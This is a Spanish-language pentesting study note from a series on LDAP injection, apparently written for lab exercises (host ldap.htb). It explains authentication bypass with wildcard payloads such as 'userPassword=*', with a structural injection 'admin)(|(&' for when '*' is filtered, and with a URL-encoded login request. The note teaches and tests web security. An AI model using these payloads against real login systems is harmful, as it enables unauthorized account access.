---
tags:
  - Web/Red-Team
  - LDAP
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[01 - Detección de LDAP Injection]]"
Nota siguiente: "[[03 - Exfiltración de datos y explotación ciega]]"
Area: "[[LDAP Injection.base|LDAP Injection]]"
---
---

El uso más directo de la LDAP injection es el **bypass de autenticación** contra un login que valida credenciales con una operación `Bind`/`Search` sobre el directorio. Es el análogo del [[02 - Bypass de autenticación con XPath|bypass en XPath]], pero explotando la sintaxis de filtros **prefija** y el comodín `*`.

# La consulta de login vulnerable

Un login que autentica contra LDAP construye un `search filter` que empareja usuario y contraseña:

```ldap
(&(uid=admin)(userPassword=password123))
```

Si la aplicación concatena la entrada sin sanitizar, controlamos ambos operandos.

# Bypass con el comodín `*`

<mark style="background: #ADCCFFA6;">El comodín `*` casa cualquier valor</mark>, lo que rompe la comprobación de contraseña:

```ldap
# usuario=admin, contraseña=*  → autentica como admin sin su contraseña
(&(uid=admin)(userPassword=*))

# usuario=*, contraseña=*  → casa TODOS los usuarios, login como el primero
(&(uid=*)(userPassword=*))

# usuario=admin*  → casa cualquier uid que empiece por "admin"
(&(uid=admin*)(userPassword=*))
```

<mark style="background: #FFB86CA6;">La tercera variante es útil cuando el `username` real está parcialmente ofuscado</mark> (p. ej. `admin_1a2b`): un prefijo conocido + `*` basta.

> [!success]+
> En estos labs el éxito se ve como un `302` redirigiendo a la página post-login (`/user.php`). En un objetivo real, cualquier cambio de "credenciales inválidas" a sesión iniciada confirma el bypass.

# Bypass sin comodín (cuando `*` está filtrado)

Muchas defensas bloquean el `*`. Entonces se inyecta **estructura de filtro** para forzar una condición universalmente verdadera. Con usuario `admin)(|(&` y contraseña `abc)`, el filtro resultante es:

```ldap
(&(uid=admin)(|(&)(userPassword=abc)))
```

<mark style="background: #8000E1A6;">El fragmento inyectado `(|(&)(userPassword=abc))` es un `OR` entre `(&)` —el `true` universal de LDAP— y `(userPassword=abc)` —falso—, que evalúa a verdadero</mark>. La consulta queda como `(&(uid=admin)(TRUE))` y autentica como `admin`. En la petición, la entrada va URL-encoded:

```http
POST /login HTTP/1.1
Host: ldap.htb
Content-Type: application/x-www-form-urlencoded

username=admin%29%28%7C%28%26&password=abc%29
```

> [!important]+ `(&)` es el `or 1=1` de LDAP
> Recordar los dos literales de la [[00 - Introducción a LDAP Injection|introducción]]: <mark style="background: #FF5582A6;">`(&)` = verdadero universal, `(|)` = falso universal</mark>. Inyectar `)(|(&` cierra el componente actual y abre un `OR` con el true universal — la técnica portable cuando el comodín está bloqueado. Es la base también de la [[03 - Exfiltración de datos y explotación ciega|explotación ciega]].

Con el acceso conseguido, el siguiente objetivo es extraer datos del directorio (usuarios, `userPassword`): [[03 - Exfiltración de datos y explotación ciega]].
